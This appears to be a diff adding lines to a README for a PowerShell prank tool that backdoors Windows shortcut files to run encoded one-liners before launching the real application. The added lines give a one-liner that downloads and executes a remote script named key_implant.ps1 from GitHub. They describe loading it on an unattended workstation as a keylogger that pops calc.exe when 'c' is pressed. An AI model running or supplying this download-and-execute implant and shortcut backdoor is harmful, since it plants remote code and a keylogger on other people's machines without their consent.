@@ -14,3 +14,8 @@ It will take arbitrary powershell 1 liners as an argument to base64 encode and e
 this will copy the icon to $env:homepath\trollz\linkbackup\google chrome.lnk for restoration
 
 it will backdoor the link with a troll msg and then redirect execution to the origional application
+
+
+iex (new-object system.net.webclient).downloadstring("https://raw.githubusercontent.com/pooki3bear/trollsrc/master/key_implant.ps1")
+
+At an unattended workstation loads up a keylogger that pops calc.exe anytime 'c' is pressed
